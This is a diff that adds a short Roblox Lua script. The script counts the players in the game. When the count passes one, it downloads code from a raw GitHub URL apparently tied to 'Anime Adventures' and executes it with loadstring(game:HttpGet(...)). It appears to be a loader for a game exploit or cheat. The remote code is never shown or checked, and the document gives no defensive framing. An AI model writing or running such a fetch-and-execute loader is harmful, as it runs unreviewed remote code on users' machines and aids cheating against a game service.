@@ -1,0 +1,18 @@
+--- {Services}>
+local Players_Service = game:GetService("Players")
+
+--- {Functions}>
+local Check_Function = function()
+    for _, Table in ipairs(Players_Service:GetChildren()) do
+        print("[".. tostring(_) .."], Player Found.")
+
+        if tonumber(_) > 1 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TrkVulcan/Anime-adventuers/main/normal%20ps", true))()
+            else
+            print("your safe")
+        end
+    end
+end
+
+--- {Call Functions}>
+Check_Function()
